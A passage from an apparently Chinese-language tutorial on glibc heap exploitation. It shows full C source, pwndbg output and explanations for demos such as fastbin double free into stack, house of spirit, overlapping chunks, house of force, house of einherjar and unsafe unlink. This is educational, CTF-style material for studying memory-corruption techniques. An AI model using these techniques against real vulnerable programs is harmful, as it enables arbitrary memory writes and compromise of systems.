(0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x6020a0 (size : 0x20f60) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 然后分配一个0x400大小的chunk，这时没有满足这个大小的chunk，所以会执行malloc_consolidate函数，将fastbin中的chunk 合并（这里是指和物理相邻的并且处于free状态的chunk合并），然后再放入unsorted bin中 ，所以p1会从fastbin中转移到unsortedbin中。然后分配器再检查bins中是否有符合的chunk，如果没有，就将unsortedbin中的chunk放入对应的bin中，这里p1被放入了smallbin[0x50] pwndbg&gt; smallbins smallbins 0x50: 0x7ffff7dd1bb8 (main_arena+152) —▸ 0x602000 ◂— 0x7ffff7dd1bb8 然后再free掉p1就不会触发doublefree 了，因为这时p1不在fastbin的头部。最后连续分配两次0x40大小的chunk，就可以取出两次p1。 fastbin_dup_into_stack源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { unsigned long long stack_var; fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var); fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a); fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b); fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c); fprintf(stderr, &quot;Start double free a\n&quot;); free(a);//double free a free(b); free(a); unsigned long long *d = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, d); fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8)); fprintf(stderr, &quot;Now the free list has [ %p ].\n&quot;, a); fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\n&quot; &quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot; &quot;so that malloc will think there is a free chunk there and agree to\n&quot; &quot;return a pointer to it.\n&quot;, a); stack_var = 0x20;//set size fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8)); fprintf(stderr, &quot;4th malloc(8): %p\n&quot;, malloc(8)); } 这个例子展示了怎么利用fastbin的Double free来分配得到位于stack的chunk。核心是控制fasbtin chunk的fd指针，将它指向stack，同时stack上要有满足大小的size值。实际上可以利用这实现分配任意地址，只要知道地址，并且地址上存在满足相应fastbin大小的size值。 先Double free pwndbg&gt; fastbins fastbins 0x20: 0x602000 —▸ 0x602020 ◂— 0x602000 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 修改fastbins chunk的fd指针为stack_add，那么fastbins链表就会指向stack_chunk pwndbg&gt; fastbins fastbins 0x20: 0x602000 —▸ 0x7fffffffdd08 —▸ 0x602010 ◂— 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 最后分配到stack的内存 ☁ glibc_2.25 [master] ⚡ ./fastbin_dup_into_stack The address we want malloc() to return is 0x7ffe3a30b948. Allocating 3 buffers. 1st malloc(8): 0x8ef010 2nd malloc(8): 0x8ef030 3rd malloc(8): 0x8ef050 Start double free a 1st malloc(8): 0x8ef010 2nd malloc(8): 0x8ef030 Now the free list has [ 0x8ef010 ]. Now, we have access to 0x8ef010 while it remains at the head of the free list. so now we are writing a fake free size (in this case, 0x20) to the stack, so that malloc will think there is a free chunk there and agree to return a pointer to it. Now, we overwrite the first 8 bytes of the data at 0x8ef010 to point right before the 0x20. 3rd malloc(8): 0x8ef010, putting the stack address on the free list 4th malloc(8): 0x7ffe3a30b948 house_of_spirit源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.\n&quot;); malloc(1); fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.\n&quot;); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;); fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;, &amp;fake_chunks[1]); fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;); a = &amp;fake_chunks[2]; fprintf(stderr, &quot;Freeing the overwritten pointer.\n&quot;); free(a); fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, &quot;malloc(0x30): %p\n&quot;, malloc(0x30)); } 这个技术核心是在目标地址伪造fake_chunk，然后将释放。最终可以实现分配指定地址的目的。要注意的是要伪造fake_chunk的nextchunk，使其size字段的prev_inuse为0x1。 其中伪造的fake_chunk要满足一些条件 fake_chunk的地址需要对齐 fake_chunk的IS_MMAPPED位不能置为1，不然在被free时会被当作mmap的chunk处理 fake_chunk的size大小要满足对应的fastbin的大小 fake_chunk的next_chunk大小要大于2*SIZE_SZ，同时小于av-&gt;system_mem (128kb) 查看伪造的fake_chunk以及 next_chunk pwndbg&gt; p fake_chunks $4 = {0x0, 0x40, 0xff0000000000, 0x0, 0x1, 0x4008cd, 0x0, 0x0, 0x400880, 0x1234} pwndbg&gt; p &amp;fake_chunks $3 = (unsigned long long (*)[10]) 0x7fffffffdcf0 pwndbg&gt; chunkinfo 0x7fffffffdcf0 ================================== Chunk info ================================== Status : Freed Unlinkable : False (FD or BK is corruption) Freeable : True prev_size : 0x0 size : 0x40 prev_inused : 0 is_mmap : 0 non_mainarea : 0 fd : 0xff0000000000 bk : 0x0 运行结果 ☁ glibc_2.25 [master] ⚡ ./house_of_spirit Calling malloc() once so that it sets up its memory. We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region. This region (memory of length: 80) contains two chunks. The first starts at 0x7ffc6d557388 and the second at 0x7ffc6d5573c8. This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size. Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffc6d557388. ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffc6d557388, which will be 0x7ffc6d557390! malloc(0x30): 0x7ffc6d557390 overlapping_chunks源码 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; int main(int argc , char* argv[]){ intptr_t *p1,*p2,*p3,*p4; fprintf(stderr, &quot;\nThis is a simple chunks overlapping problem\n\n&quot;); fprintf(stderr, &quot;Let&#39;s start to allocate 3 chunks on the heap\n&quot;); p1 = malloc(0x100 - 8); p2 = malloc(0x100 - 8); p3 = malloc(0x80 - 8); fprintf(stderr, &quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;, p1, p2, p3); memset(p1, &#39;1&#39;, 0x100 - 8); memset(p2, &#39;2&#39;, 0x100 - 8); memset(p3, &#39;3&#39;, 0x80 - 8); free(p2); int evil_chunk_size = 0x181; int evil_region_size = 0x180 - 8; *(p2-1) = evil_chunk_size; // we are overwriting the &quot;size&quot; field of chunk p2 p4 = malloc(evil_region_size); fprintf(stderr, &quot;\np4 has been allocated at %p and ends at %p\n&quot;, (char *)p4, (char *)p4+evil_region_size); fprintf(stderr, &quot;Let&#39;s run through an example. Right now, we have:\n&quot;); fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4); fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3); fprintf(stderr, &quot;\nIf we memset(p4, &#39;4&#39;, %d), we have:\n&quot;, evil_region_size); memset(p4, &#39;4&#39;, evil_region_size); fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4); fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3); fprintf(stderr, &quot;\nAnd if we then memset(p3, &#39;3&#39;, 80), we have:\n&quot;); memset(p3, &#39;3&#39;, 80); fprintf(stderr, &quot;p4 = %s\n&quot;, (char *)p4); fprintf(stderr, &quot;p3 = %s\n&quot;, (char *)p3); } 这个是一个简单的overlapping_chunk的例子，它通过修改被free掉的chunk_p2的size字段，使其增大，大小为p2_size + p3_size 。然后再malloc 相应大小的chunk_p4，就可以通过chunk_p4控制 chunk_p3的内容。这个 evil_chunk_size需要注意下它的标志位，尽量保持堆的稳定性。 调试一下： 修改size前 pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x603280 (size : 0x20d80) last_remainder: 0x0 (size : 0x0) unsortbin: 0x603100 (size : 0x100) pwndbg&gt; chunkinfo 0x603100 ================================== Chunk info ================================== Status : Freed Unlinkable : True Result of unlink : FD-&gt;bk (*0x7ffff7dd1b90) = BK (0x603100 -&gt; 0x7ffff7dd1b78) BK-&gt;fd (*0x7ffff7dd1b88) = FD (0x603100 -&gt; 0x7ffff7dd1b78) Freeable : false -&gt; Double free chunkaddr(0x603100) inused bit is not seted ) prev_size : 0x3131313131313131 size : 0x100 prev_inused : 1 is_mmap : 0 non_mainarea : 0 fd : 0x7ffff7dd1b78 bk : 0x7ffff7dd1b78 修改p2的size字段 0x602100 PREV_INUSE { prev_size = 0x3131313131313131, size = 0x181, fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, fd_nextsize = 0x3232323232323232, bk_nextsize = 0x3232323232323232 } 通过p2修改p3的内容，输出结果 ☁ glibc_2.25 [master] ⚡ ./overlapping_chunks This is a simple chunks overlapping problem Let&#39;s start to allocate 3 chunks on the heap The 3 chunks have been allocated here: p1=0x9af010 p2=0x9af110 p3=0x9af210 p4 has been allocated at 0x9af110 and ends at 0x9af288 Let&#39;s run through an example. Right now, we have: p4 = xۦ�� 3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333� If we memset(p4, &#39;4&#39;, 376), we have: p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444� 3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444� And if we then memset(p3, &#39;3&#39;, 80), we have: p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444� 3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444� overlapping_chunks_2源码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; int main(){ intptr_t *p1,*p2,*p3,*p4,*p5,*p6; unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6,fake_size; int prev_in_use = 0x1; fprintf(stderr, &quot;\nThis is a simple chunks overlapping problem&quot;); fprintf(stderr, &quot;\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n&quot;); fprintf(stderr, &quot;\nLet&#39;s start to allocate 5 chunks on the heap:&quot;); p1 = malloc(1000);//0x3e8 actually chunk_size ==&gt; 0x3f0 p2 = malloc(1000); p3 = malloc(1000); p4 = malloc(1000); p5 = malloc(1000); real_size_p1 = malloc_usable_size(p1); real_size_p2 = malloc_usable_size(p2); real_size_p3 = malloc_usable_size(p3); real_size_p4 = malloc_usable_size(p4); real_size_p5 = malloc_usable_size(p5); fprintf(stderr, &quot;\n\nchunk p1 from %p to %p&quot;, p1, (unsigned char *)p1+malloc_usable_size(p1)); fprintf(stderr, &quot;\nchunk p2 from %p to %p&quot;, p2, (unsigned char *)p2+malloc_usable_size(p2)); fprintf(stderr, &quot;\nchunk p3 from %p to %p&quot;, p3, (unsigned char *)p3+malloc_usable_size(p3)); fprintf(stderr, &quot;\nchunk p4 from %p to %p&quot;, p4, (unsigned char *)p4+malloc_usable_size(p4)); fprintf(stderr, &quot;\nchunk p5 from %p to %p\n&quot;, p5, (unsigned char *)p5+malloc_usable_size(p5)); memset(p1,&#39;A&#39;,real_size_p1); memset(p2,&#39;B&#39;,real_size_p2); memset(p3,&#39;C&#39;,real_size_p3); memset(p4,&#39;D&#39;,real_size_p4); memset(p5,&#39;E&#39;,real_size_p5); fprintf(stderr, &quot;\nLet&#39;s free the chunk p4.\nIn this case this isn&#39;t coealesced with top chunk since we have p5 bordering top chunk after p4\n&quot;); free(p4); fprintf(stderr, &quot;\nLet&#39;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n&quot;); fake_size = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; fprintf(stderr,&quot;\n fake_size ==&gt; %x \n&quot;,fake_size); *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE /*fake_size = real_size_p2 + real_size_p3 + prev_in_use + chunk_header_size*/ fprintf(stderr, &quot;\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n&quot;); fprintf(stderr, &quot;\nThis operation will basically create a big free chunk that wrongly includes p3\n&quot;); free(p2); fprintf(stderr, &quot;\nNow let&#39;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\n&quot;); p6 = malloc(2000); real_size_p6 = malloc_usable_size(p6); fprintf(stderr, &quot;\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n&quot;); fprintf(stderr, &quot;\nchunk p6 from %p to %p&quot;, p6, (unsigned char *)p6+real_size_p6); fprintf(stderr, &quot;\nchunk p3 from %p to %p\n&quot;, p3, (unsigned char *) p3+real_size_p3); fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;); fprintf(stderr, &quot;%s\n&quot;,(char *)p3); fprintf(stderr, &quot;\nLet&#39;s write something inside p6\n&quot;); memset(p6,&#39;F&#39;,1500); fprintf(stderr, &quot;\nData inside chunk p3: \n\n&quot;); fprintf(stderr, &quot;%s\n&quot;,(char *)p3); } 这个也是overlapping_chunk的例子，不过它造成overlapping是在free前完成的，也就是释放一个size字段被修改后的chunk，这个修改后的chunk会将它之后的chunk给包括进去。 修改p2的size字段，大小为real_size_p2 + real_size_p3 + prev_in_use + chunk_header_size 修改前： 修改后 将p2 释放掉,再申请一个大小为2000的chunk，就可以返回p2，通过p2就可以控制p3的内容了 运行结果 house_of_force源码 #include &lt;stdio.h&gt; #include &lt;stdint.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; char bss_var[] = &quot;This is a string that we want to overwrite.&quot;; int main(int argc , char* argv[]) { fprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;); fprintf(stderr, &quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;, bss_var); fprintf(stderr, &quot;Its current value is: %s\n&quot;, bss_var); fprintf(stderr, &quot;\nLet&#39;s allocate the first chunk, taking space from the wilderness.\n&quot;); intptr_t *p1 = malloc(256); fprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\n&quot;, p1 - sizeof(long)*2); fprintf(stderr, &quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;); int real_size = malloc_usable_size(p1); fprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;, real_size + sizeof(long)*2); //----- VULNERABILITY ---- intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long)); fprintf(stderr, &quot;\nThe top chunk starts at %p\n&quot;, ptr_top); fprintf(stderr, &quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;); fprintf(stderr, &quot;Old size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;// -1 ==&gt;0xffffffffffffffff fprintf(stderr, &quot;New size of top chunk %#llx\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); //------------------------ unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top; fprintf(stderr, &quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot; &quot;we will malloc %#lx bytes.\n&quot;, bss_var, ptr_top, evil_size); void *new_ptr = malloc(evil_size); void* ctr_chunk = malloc(100); fprintf(stderr, &quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;); fprintf(stderr, &quot;malloc(100) =&gt; %p!\n&quot;, ctr_chunk); fprintf(stderr, &quot;Now, we can finally overwrite that value:\n&quot;); fprintf(stderr, &quot;... old string: %s\n&quot;, bss_var); fprintf(stderr, &quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;); strcpy(ctr_chunk, &quot;YEAH!!!&quot;); fprintf(stderr, &quot;... new string: %s\n&quot;, bss_var); } house_of_force是一种针对top_chunk的攻击，需要满足两点条件： 能控制top_chunk的size字段 能够自由的分配堆的大小 原理： 假设有一个溢出漏洞，可以改写 top chunk 的size字段，然后将其改为一个非常大的值， 以确保所有的 malloc 将使用 top chunk 分配，而不会调用 mmap。这时如果攻击者 malloc 一个很大的数目（负有符号整数），top chunk 的位置加上这个大数，造成整 数溢出，结果是 top chunk 能够被转移到堆之前的内存地址（如程序的 .bss 段、.data 段、GOT 表等），下次再执行 malloc 时，攻击者就能够控制转移之后地 址处的内存。 这个例子主要展示了通过top_chunk实现任意高地址的分配，首先将top_chunk的size字段修改为一个很大的值，这里直接修改为-1（32位下也就是0xffffffff，64位下就是0xffffffffffffffff），然后通过分配很大的内存，将top_chunk的地址抬高到我们想要控制的内存附近，然后再malloc就可以分配到想要控制的内存。 这里比较关键的是分配大小的计算 也就是evil_size的计算，计算方法如下 /* * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata): * new_top = old_top + nb * nb = new_top - old_top * req + 2sizeof(long) = new_top - old_top * req = new_top - old_top - 2sizeof(long) * req = dest - 2sizeof(long) - old_top - 2sizeof(long) * req = dest - old_top - 4*sizeof(long) */ 简单的来说 evil_size = dest - top_chunk_add - size(chunk_header) size(chunk_header)是chunk头的大小，32位时为0x10,64位时为0x20 简单调试下: 修改top_chunk的size字段 pwndbg&gt; p ptr_top $2 = (intptr_t *) 0x603110 pwndbg&gt; x/10gx 0x603110 0x603110: 0x0000000000000000 0xffffffffffffffff 0x603120: 0x0000000000000000 0x0000000000000000 0x603130: 0x0000000000000000 0x0000000000000000 0x603140: 0x0000000000000000 0x0000000000000000 0x603150: 0x0000000000000000 0x0000000000000000 分配evil_chunk，将top_chunk地址抬高到 目标地址 `pwndbg&gt; p &amp;bss_var$5 = (char (*)[44]) 0x602060 &lt;bss_var&gt;pwndbg&gt; top_chunk0x602050 PREV_INUSE { prev_size = 0x0, size = 0x10b9, fd = 0x2073692073696854, bk = 0x676e697274732061, fd_nextsize = 0x6577207461687420, bk_nextsize = 0x6f7420746e617720} 最后就可以分配到包含目标地址的chunk了 输出结果 ![1552110821446](/picture/1552110821446.png) #### House of Einherjar 源码： ```c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; int main() { fprintf(stderr, &quot;Welcome to House of Einherjar!\n&quot;); fprintf(stderr, &quot;Tested in Ubuntu 16.04 64bit.\n&quot;); fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.\n&quot;); uint8_t* a; uint8_t* b; uint8_t* d; fprintf(stderr, &quot;\nWe allocate 0x38 bytes for &#39;a&#39;\n&quot;); a = (uint8_t*) malloc(0x38); fprintf(stderr, &quot;a: %p\n&quot;, a); int real_a_size = malloc_usable_size(a); fprintf(stderr, &quot;Since we want to overflow &#39;a&#39;, we need the &#39;real&#39; size of &#39;a&#39; after rounding: %#x\n&quot;, real_a_size); // create a fake chunk fprintf(stderr, &quot;\nWe create a fake chunk wherever we want, in this case we&#39;ll create the chunk on the stack\n&quot;); fprintf(stderr, &quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;); fprintf(stderr, &quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;); fprintf(stderr, &quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;); size_t fake_chunk[6]; fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk&#39;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin fake_chunk[2] = (size_t) fake_chunk; // fwd fake_chunk[3] = (size_t) fake_chunk; // bck fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize fprintf(stderr, &quot;Our fake chunk at %p looks like:\n&quot;, fake_chunk); fprintf(stderr, &quot;prev_size (not used): %#lx\n&quot;, fake_chunk[0]); fprintf(stderr, &quot;size: %#lx\n&quot;, fake_chunk[1]); fprintf(stderr, &quot;fwd: %#lx\n&quot;, fake_chunk[2]); fprintf(stderr, &quot;bck: %#lx\n&quot;, fake_chunk[3]); fprintf(stderr, &quot;fwd_nextsize: %#lx\n&quot;, fake_chunk[4]); fprintf(stderr, &quot;bck_nextsize: %#lx\n&quot;, fake_chunk[5]); /* In this case it is easier if the chunk size attribute has a least significant byte with * a value of 0x00. The least significant byte of this will be 0x00, because the size of * the chunk includes the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0xf8); int real_b_size = malloc_usable_size(b); fprintf(stderr, &quot;\nWe allocate 0xf8 bytes for &#39;b&#39;.\n&quot;); fprintf(stderr, &quot;b: %p\n&quot;, b); uint64_t* b_size_ptr = (uint64_t*)(b - 8); /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/ fprintf(stderr, &quot;\nb.size: %#lx\n&quot;, *b_size_ptr); fprintf(stderr, &quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;); fprintf(stderr, &quot;We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;\n&quot;); a[real_a_size] = 0; fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr); fprintf(stderr, &quot;This is easiest if b.size is a multiple of 0x100 so you &quot; &quot;don&#39;t change the size of b, only its prev_inuse bit\n&quot;); fprintf(stderr, &quot;If it had been modified, we would need a fake chunk inside &quot; &quot;b where it will try to consolidate the next chunk\n&quot;); // Write a fake prev_size to the end of a fprintf(stderr, &quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot; &quot;it will consolidate with our fake chunk\n&quot;, sizeof(size_t)); size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); fprintf(stderr, &quot;Our fake prev_size will be %p - %p = %#lx\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size); *(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size; //Change the fake chunk&#39;s size to reflect b&#39;s new prev_size fprintf(stderr, &quot;\nModify fake chunk&#39;s size to reflect b&#39;s new prev_size\n&quot;); fake_chunk[1] = fake_size; // free b and it will consolidate with our fake chunk fprintf(stderr, &quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;); free(b); fprintf(stderr, &quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;, fake_chunk[1]); fprintf(stderr, &quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;); d = malloc(0x200); fprintf(stderr, &quot;Next malloc(0x200) is at %p\n&quot;, d); } house_of_einherjar主要利用了free函数中的向后合并的操作的机制，可以通过malloc返回任意地址的chunk。 这个例子中，它在栈上伪造了一个fake_chunk，然后修改chunk_b的prev_size字段 以及 size字段的prev_inuse标志位。使prev_size = b - fake_chunk - sizeof(chunk_header)， prev_inuse为0。然后当free掉b时，它会向后合并，最后得到的chunk地址就会为fake_chunk，当再次malloc时，就可以分配到栈上的空间。 伪造的fake_chunk的size==&gt; b - fake_chunk - sizeof(chunk_header) 注意： 伪造的fake_chunk中的 fd和bk指针要指向自己，用来bypass unlink 后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize)) 相邻的chunk会共享prev_size字段，当低地址的chunk处于使用状态时，高地址的chunk的prev_size字段就可以被低地址的chunk使用，形成空间的复用，所以可能可以通过低地址的chunk修改高地址的chunk的prev_inuse标志位。 调试一下： 伪造的fake_chunk pwndbg&gt; x/10gx &amp;fake_chunk 0x7fffffffdd10: 0x0000000000000100 0xffff800000605330 0x7fffffffdd20: 0x00007fffffffdd10 0x00007fffffffdd10 0x7fffffffdd30: 0x00007fffffffdd10 0x00007fffffffdd10 0x7fffffffdd40: 0x00007fffffffde30 0x0e2957f6498f5000 0x7fffffffdd50: 0x0000000000400c00 0x00007ffff7a2d830 free掉b后，返回的chunk，可以发现fake_chunk的size字段增大了 b.size的大小 pwndbg&gt; x/10gx &amp;fake_chunk 0x7fffffffdd10: 0x0000000000000100 0xffff8000006262f1 0x7fffffffdd20: 0x00007fffffffdd10 0x00007fffffffdd10 0x7fffffffdd30: 0x00007fffffffdd10 0x00007fffffffdd10 0x7fffffffdd40: 0x00007fffffffde30 0x0e2957f6498f5000 0x7fffffffdd50: 0x0000000000400c00 0x00007ffff7a2d830 最后malloc便可以返回fake_chunk的内存 运行结果 unsafe_unlink这个我前面总结过了，这里就讲解一下这个例子 源码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; uint64_t *chunk0_ptr; int main() { fprintf(stderr, &quot;Welcome to unsafe unlink 2.0!\n&quot;); fprintf(stderr, &quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;); fprintf(stderr, &quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;); fprintf(stderr, &quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;); int malloc_size = 0x80; //we want to be big enough not to use fastbins int header_size = 2; fprintf(stderr, &quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 fprintf(stderr, &quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;, &amp;chunk0_ptr, chunk0_ptr); fprintf(stderr, &quot;The victim chunk we are going to corrupt is at %p\n\n&quot;, chunk1_ptr); fprintf(stderr, &quot;We create a fake chunk inside chunk0.\n&quot;); fprintf(stderr, &quot;We setup the &#39;next_free_chunk&#39; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;); chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3); fprintf(stderr, &quot;We setup the &#39;previous_free_chunk&#39; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;); fprintf(stderr, &quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;); chunk0_ptr[3] = (uint64_t) 